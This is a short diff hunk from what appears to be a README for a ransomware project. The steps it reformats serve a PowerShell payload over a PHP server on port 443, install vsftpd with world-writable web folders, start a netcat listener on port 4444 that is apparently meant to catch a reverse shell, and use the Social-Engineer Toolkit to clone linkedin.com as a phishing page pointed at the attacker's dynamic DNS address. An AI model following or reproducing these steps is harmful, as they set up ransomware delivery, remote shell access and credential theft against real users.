@@ -19,12 +19,12 @@ ransomware. <br />
 Start the server running sudo php -S 0.0.0.0:443 –t /directory/to/folder/of/powershellScript/ (in our
 case the path is /home/kali/sofia/)
 2. Open a cmd and install ftp: <br />
-sudo apt-get install vsftpd <br />
-sudo nano /etc/vsftpd.conf <br />
-write_enable=YES <br />
-sudo chown -R kali /var/www/html <br />
-sudo chmod 757 -R /var/www/html <br />
-service vsftpd start 
+>sudo apt-get install vsftpd <br />
+>sudo nano /etc/vsftpd.conf <br />
+>write_enable=YES <br />
+>sudo chown -R kali /var/www/html <br />
+>sudo chmod 757 -R /var/www/html <br />
+>service vsftpd start 
 3. In another cmd write nc –lp 4444 to set the netcat listening to that port.
 4. The last cmd, “set setoolkit” <br />
 We select the option 1,2,3 then we put our public IP of the dynamic dns and for cloning linkedin.com <br />
